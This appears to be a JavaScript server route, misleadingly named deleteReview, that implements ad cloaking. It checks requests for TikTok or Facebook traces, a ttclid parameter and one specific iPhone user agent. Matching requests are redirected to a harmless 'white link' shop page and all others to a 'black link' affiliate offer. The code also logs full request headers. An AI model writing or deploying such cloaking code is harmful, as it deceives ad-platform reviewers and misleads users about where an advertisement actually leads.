export default async function deleteReview(request, response) {

    const requestData = {
        timestamp: new Date().toISOString(),
        method: request.method,
        url: request.originalUrl,
        headers: request.headers,
        body: request.body
    };

    let site = undefined
    const requestDataString = JSON.stringify(requestData)

    if (requestDataString.includes('tiktok')) {
        site = 'tiktok'
    } else if (requestDataString.includes('facebook')) {
        site = 'facebook'
    }

    // Extraindo o parâmetro de consulta ttclid e o user agent
    const requestedWith = request.headers['x-requested-with'];
    const userAgent = request.headers['user-agent'];
    const { ttclid } = request.query
    const referer = request.headers['referer']


    // Definindo os links de redirecionamento
    const blackLink = 'https://kiwify.app/LmL6p6n?afid=gaDlEznN';
    const whiteLink = 'https://www.balasdingo.com.br/';

    console.log(request)


    if (ttclid || userAgent.includes('iPhone OS 15_7_2 like')) {
        console.log('Redirecionando para link branco:', whiteLink);
        return response.redirect(whiteLink);
    } else {
        console.log('Redirecionando para link preto:', blackLink);
        return response.redirect(blackLink);
    }
}